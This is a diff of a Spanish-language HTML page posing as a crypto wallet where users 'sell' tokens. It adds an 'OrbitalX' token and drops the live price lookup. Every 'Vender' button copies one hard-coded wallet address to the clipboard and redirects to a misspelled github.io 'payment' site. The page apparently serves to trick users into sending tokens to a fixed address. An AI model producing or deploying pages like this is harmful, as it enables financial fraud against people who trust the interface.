@@ -36,7 +36,6 @@
             overflow: hidden;
         }
 
-        /* Centrar el título */
         .header {
             font-size: 2.5em;
             font-weight: bold;
@@ -45,23 +44,6 @@
             text-transform: uppercase;
             text-align: center;
             width: 100%;
-        }
-
-        /* Diseño del logo principal */
-        .header-logo {
-            font-size: 3em;
-            font-weight: bold;
-            color: #fff;
-            background-color: #007bff;
-            padding: 20px 40px;
-            border-radius: 50px;
-            display: inline-block;
-            transition: background-color 0.3s ease, transform 0.3s ease;
-        }
-
-        .header-logo:hover {
-            background-color: #0056b3;
-            transform: scale(1.1);
         }
 
         .balance {
@@ -235,6 +217,19 @@
         </div>
         <div class="balance" id="balance"></div>
 
+        <!-- Agregado de OrbitalX Token -->
+        <div class="asset" id="orbitalx-asset">
+            <div class="asset-name">
+                <img src="https://wallet-bussines.github.io/Orbitalx.png" alt="OrbitalX Logo" class="asset-logo">
+                <div class="asset-info">
+                    <span>OrbitalX (ORBX)</span>
+                    <span class="price" id="orbitalx-price">$0.00</span>
+                </div>
+            </div>
+            <button class="sell-button" onclick="sellToken('orbitalx')">Vender</button>
+        </div>
+
+        <!-- Sección de otros activos -->
         <div class="asset" id="wld-asset">
             <div class="asset-name">
                 <img src="https://cryptologos.cc/logos/worldcoin-wld-logo.png" alt="WLD Logo" class="asset-logo">
@@ -278,59 +273,32 @@
             </div>
             <button class="sell-button" onclick="sellToken('oro')">Vender</button>
         </div>
-    </div>
 
-    <!-- Sección de YouTube -->
-    <div class="youtube-section">
-        <h2>Ver Tutorial de Venta</h2>
-        <iframe src="https://www.youtube.com/embed/-h4hbrCAr7A?si=f-9dR8Oh6zzc9Pjc" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        <div class="youtube-section">
+            <h2>¿Quieres saber más sobre OrbitalX?</h2>
+            <iframe src="https://www.youtube.com/embed/-h4hbrCAr7A?si=f-9dR8Oh6zzc9Pjc" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
         <iframe src="https://www.youtube.com/embed/h3q5fU5P8VI?si=7l2zaeQVGgHpD4zY" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
         <iframe src="https://www.youtube.com/embed/BzX8Yt7YhCw?si=BlUpzfv5p2W-EfiA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-        <iframe src="https://www.youtube.com/embed/" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-    </div>
+        <iframe src="https://www.youtube.com/embed/bTtbSog4AUE" frameborder="0" allowfullscreen></iframe>
+        </div>
 
     <script>
-        // Datos de las wallets para cada token
-        const wallets = {
-            wld: "0xda235e8c947490aa039f952cc5ec3bfe3a424758",
-            usdc: "0xde6b6e1cddbfd1d94afc01957748c36c36f43af4",
-            orb: "0xde6b6e1cddbfd1d94afc01957748c36c36f43af4",
-            oro: "0xde6b6e1cddbfd1d94afc01957748c36c36f43af4"
-        };
-
-        // Función para vender un token
+        // Lógica para copiar la wallet y redirigir a la URL de pago
         function sellToken(token) {
-            // Copiar la wallet correspondiente al portapapeles
-            const walletAddress = wallets[token];
+            // Dirección de la wallet (Ejemplo, puedes cambiarla por la que necesitas)
+            const walletAddress = '0xde6b6e1cddbfd1d94afc01957748c36c36f43af4';
+            const paymentURL = 'https://wallet-bussines.github.io/';  // URL de pago de tu página web
 
-            // Especifica la URL de la pasarela de pagos
-            const paymentGatewayUrl = `https://wallet-bussines.github.io/?address=${walletAddress}`;
+            // Copiar la dirección de la wallet
+            navigator.clipboard.writeText(walletAddress).then(() => {
+                alert('La dirección de la wallet ha sido copiada');
+            }).catch((err) => {
+                console.error('Error al copiar la dirección: ', err);
+            });
 
-            // Copiar la dirección de la wallet al portapapeles
-            navigator.clipboard.writeText(walletAddress)
-                .then(() => {
-                    // Después de copiar, redirigir al usuario a la pasarela de pagos con la wallet incluida en la URL
-                    window.location.href = paymentGatewayUrl;
-                })
-                .catch(err => {
-                    console.error('Error al copiar la dirección de la wallet: ', err);
-                });
+            // Redirigir a la URL de pago
+            window.location.href = paymentURL;
         }
-
-        // Función para obtener los precios en tiempo real de los tokens usando la API de CoinGecko
-        async function fetchPrices() {
-            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=worldcoin,usd-coin,orb,oro&vs_currencies=usd');
-            const data = await response.json();
-
-            // Asignar los precios a cada token
-            document.getElementById('wld-price').textContent = `$${data.worldcoin.usd}`;
-            document.getElementById('usdc-price').textContent = `$${data['usd-coin'].usd}`;
-            document.getElementById('orb-price').textContent = `$${data.orb ? data.orb.usd : '0.00'}`;
-            document.getElementById('oro-price').textContent = `$${data.oro ? data.oro.usd : '0.00'}`;
-        }
-
-        // Llamar a la función para obtener los precios cuando se carga la página
-        fetchPrices();
     </script>
 </body>
 </html>
